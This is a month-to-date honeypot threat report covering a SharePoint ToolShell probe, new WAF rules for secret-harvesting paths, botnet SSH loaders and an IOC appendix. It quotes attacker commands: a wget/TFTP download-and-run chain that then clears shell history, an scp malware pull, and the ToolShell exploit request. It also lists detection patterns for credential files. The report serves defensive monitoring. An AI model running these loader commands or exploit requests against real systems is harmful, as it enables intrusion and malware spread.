# WebSpeare + Cowrie — Threat Report, September 2026 (MTD)

**Reporting window:** 2026-09-01 → 2026-09-13 (month-to-date)
**Sensors:** Cowrie SSH/Telnet (`do-us/new-york`) + 2× WebSpeare web nodes (`192.168.67.2/.3`)
**Maintainer:** Oak Atsume (DC801) · **Source:** Graylog (GELF feed)

---

## Executive summary

- **New headline exploit: SharePoint "ToolShell."** A single Contabo host (`85.239.243.110`) fired the **CVE-2025-53770 / CVE-2025-49704** chain (`POST /_layouts/15/ToolPane.aspx` + ExcelDataSet gadget). Decoded gadget was a **PoC/vuln-check, not weaponized RCE**. It was **unflagged** — now flagged (`drop`).
- **Wave of modern secret-harvesting we weren't catching** — flagged this cycle: **Vite `@fs` arbitrary file read**, **cloud-CLI creds** (gcloud/Azure), **Terraform state & CI secrets**, and notably **AI-tool configs** (`/.cursor/mcp.json`, `/.mcp.json`).
- **Unique SSH/telnet activity:** a **"Sakura" botnet** loader using **wget + TFTP** fallback (`94.154.43.200`), RedTail's ongoing **scp + embedded-SSH-key** delivery (`dlr@217.60.195.113`), SSH **proxy-abuse tunneling** to Google/AWS:443, and an unusually **sophisticated portable host-fingerprinting script** (see §5).
- **Our decoys are paying off:** the config-secrets decoy served **2,740 canaried `.env`** files (plus `.env.local`/`.env.production`/`credentials.json`) to harvesters this month.
- **Volume surged** — 120K–337K events/day early month (peak **Sep 5 = 337K**) vs August's ~70K baseline, easing toward ~77K by Sep 11–12.
- **Still no LinkFlow / CVE-2026-5027** anywhere.

---

## 1. Volume & caveats

```
Sep01 ████████████████ 166K   Sep06 █████████████████ 179K   Sep11 ███████ 76K
Sep02 █████████████████████ 221K   Sep07 ████████████ 121K   Sep12 ███████ 77K
Sep03 █████████████ 138K   Sep08 ███████████████████ 201K   Sep13 ▏ 4.5K (partial)
Sep04 █████ 57K       Sep09 ███████████ 118K
Sep05 ████████████████████████████████ 337K ← peak   Sep10 ████████ 86K
```
- **Aug 31** was near-zero (378) — tail of the late-August outages; September collection is otherwise healthy.
- Early-September volume is 2–5× August baseline, cooling to baseline by mid-month.

## 2. Geography & infrastructure

**Top origins:** United Kingdom (233K — inflated by the `138.226.239.x` SSH tunnelers), United States (186K), Netherlands (125K), Indonesia (115K), Vietnam (115K), Bulgaria (92K), India (84K), Brazil (66K).

**Shift worth noting:** web scanning is now heavily **Google Cloud-hosted** — top web sources are almost all GCP ranges (`34.79.39.30`, `34.75.91.214`, `34.125.214.79`, `34.16.220.235`, `35.187.232.92`, `35.205.146.225`). Attackers are renting GCP for short-lived scan nodes.

---

## 3. The headline: SharePoint ToolShell (CVE-2025-53770 / -49704)

| | |
|---|---|
| Source | `85.239.243.110` (**Contabo Inc.**) · 2026-09-12 08:32 UTC |
| Request | `POST /_layouts/15/ToolPane.aspx`, `MSOTlPn_DWP=` PerformancePoint `ExcelDataSet` gadget, `MSOTlPn_Uri=http://134.199.244.163/…AclEditor.ascx` |
| Payload | Decoded gzip gadget = 490-byte `DataSet` diffgram with an `SP5377` PoC marker — **no command-exec gadget → vuln check, not RCE** |
| Scope | **1 hit, this host only** — lone probe, not a broad campaign (yet) |
| Prior WAF | **none (missed)** → now flagged `critical`/`drop` |

Contabo overall this month had an "enterprise-appliance" flavor: ToolShell, RedTail (`/containers/json` Docker API), SysAid `/technician` (CVE-2025-2775), FortiOS `/remote/login` (CVE-2023-27997).

---

## 4. Odd web traffic flagged this cycle

From the `NOT _exists_:waf` bucket — all previously uncaught, now in `observed-2026-09-gaps.json`:

| New rule | Level | Catches |
|---|---|---|
| SharePoint ToolShell RCE | critical | `/_layouts/15/ToolPane.aspx`, `MSOTlPn_DWP=/Uri=` |
| Vite Dev-Server Arbitrary File Read | high | `/@fs/…`, `/@vite/…`, `/.vite/…` (e.g. `/@fs/root/.config/gcloud/…creds.json`) |
| Cloud CLI Credential Theft | critical | gcloud `application_default_credentials.json`, `/.azure/*`, `azure-credentials.json`, `google-services.json` |
| IaC / State Secret Disclosure | high | `terraform.tfstate(.backup)`, `terraform.tfvars`, `/.terraform/`, `/.jenkins/config.xml`, `/.drone.yml`, `/.git-credentials`, `/.github/workflows/*.yml` |
| AI Assistant Config Probe | medium | `/.cursor/mcp.json`, `/.mcp.json`, `/.claude/`, `/.continue/` |
| JS Runtime Env Config Disclosure | medium | `env.js`, `__env.js`, `environment.js`, `env.json`, `config.js` |
| Yii2 Debug Toolbar Exposure | high | `/debug/default/view` |

**Notable trend:** attackers are hunting *cloud & dev-supply-chain* secrets (Terraform state, cloud-CLI tokens, and — new — AI-assistant MCP configs that may hold API keys), not just classic `.env`/`.git`.

---

## 5. Unique SSH / Telnet activity

- **"Sakura" botnet (new)** — `wget http://94.154.43.200/Sakura.sh; … tftp -g 94.154.43.200 -r tftp1.sh; … history -c`, plus multi-arch pulls (`m-i.p-s.Sakura`, `x-8.6-.Sakura`, …). **TFTP fallback** is unusual — survives environments where HTTP egress is blocked.
- **RedTail (ongoing)** — still writing an embedded **OpenSSH private key** and pulling via `scp dlr@217.60.195.113:sh` (HTTPS fallback). Same operator handle as prior months.
- **Sophisticated host-fingerprinter (unique)** — a large, defensively-written portable one-liner that enumerates uname/arch/uptime/CPU (with a full **ARM MIDR→core-name lookup table**), GPU (`lspci`), `last`, and runs a **write-and-execute `filter` probe to confirm code-exec works** before committing. Far more polished than typical botnet recon — characteristic of a careful multi-arch loader framework. Worth watching.
- **SSH proxy-abuse tunneling** — `138.226.239.233/.234` (UK) and `77.90.185.17` (Iran) tunneling to **Google/AWS/Akamai :443**; `176.53.159.196` (TR, top brute) probing `1.1.1.1:53` — validating the honeypot as an open relay.
- **New malware hosts:** `213.232.114.14/handshakebins.sh`, `176.65.139.235/cat.sh`, `94.154.43.200` (Sakura).
- **Top SSH brute:** `195.178.110.26` (53K).

---

## 6. WAF status

- **Working in production:** config-secrets decoy (2,740 `.env` + variants served as canaries), App-Config rule (716), PHPUnit/PHPInfo decoys, GraphQL/IoT-Boa/LFI-RFI rules — the recent ruleset is live.
- **Added this cycle:** `observed-2026-09-gaps.json` (7 rules above), validated (all 26 observed missed paths classify; zero false positives on benign).
- ⚠️ **Deploy lag (see memory):** live sensors run an older ruleset than the repo — e.g. `rtsp://…` and some config-file rules written earlier are *still* in the miss bucket. **These new rules only take effect after a sensor redeploy.**
- **Reminder:** refresh the config-secrets **canary tokens** — they're being actively harvested, so live canarytokens would start yielding phone-home attribution.

---

## 7. IOC appendix (September)

**Exploit / notable**
- `85.239.243.110` (Contabo) — SharePoint ToolShell · `134.199.244.163` — ToolShell staging host referenced in `MSOTlPn_Uri`

**Malware distribution**
- `94.154.43.200` (Sakura, HTTP+TFTP) · `213.232.114.14/handshakebins.sh` · `176.65.139.235/cat.sh` · `217.60.195.113` (RedTail, scp `dlr@`)

**SSH brute / proxy-abuse**
- `195.178.110.26` (53K brute) · `138.226.239.233/.234` (UK, tunnel→cloud:443) · `77.90.185.17` (Iran, tunnel) · `176.53.159.196` (TR)

**Web scanning infra**
- GCP ranges `34.79.39.30`, `34.75.91.214`, `34.125.214.79`, `35.187.232.92`, `35.205.146.225`

**CVEs / signatures**
- CVE-2025-53770 / CVE-2025-49704 (ToolShell) · Vite `@fs` (CVE-2025-30208 family) · CVE-2025-2775 (SysAid) · CVE-2023-27997 (FortiOS) · CVE-2024-4577 (RedTail) · CVE-2017-9841 (PHPUnit decoy) · CVE-2026-24061 (telnet)

---

## 8. Recommendations

1. **Redeploy sensors** to activate the July/August/September gap rules + broadened decoys (highest-leverage; several written rules still aren't live).
2. **Refresh canary tokens** in the config-secrets decoy — it's actively feeding attackers fake secrets.
3. **Consider extending the decoy** to serve canaried `terraform.tfstate` / gcloud / Azure credentials — those are now heavily hunted and make excellent canaries.
4. **Watch the sophisticated fingerprinter and Sakura's TFTP delivery** — both suggest a more capable actor than the commodity IoT noise.
5. **LinkFlow / CVE-2026-5027:** send an endpoint/param signature if you have one and I'll sweep + rule it.
